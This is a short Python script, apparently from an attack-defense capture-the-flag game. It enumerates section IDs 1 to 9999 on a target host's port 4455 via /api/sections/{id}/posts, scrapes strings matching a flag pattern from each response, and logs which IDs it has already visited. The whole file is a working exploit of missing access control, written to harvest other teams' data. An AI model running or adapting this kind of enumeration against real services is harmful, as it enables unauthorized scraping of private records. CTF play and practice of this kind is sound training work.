#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests, random, string
from storage import storage_set, storage_get

ip = sys.argv[1] + ':4455'
s = requests.Session()

for i in range(1,10000):
    if not storage_get(ip + ':' + str(i)):
        html = s.get('http://{}//api/sections/{}/posts'.format(ip, i), timeout=(None,None)).text
        if len(html) == 1552:
            break
        flag = re.findall('[A-Z0-9]{31}=', html)
        print(flag)
        storage_set(ip + ':' + str(i))
s.close()


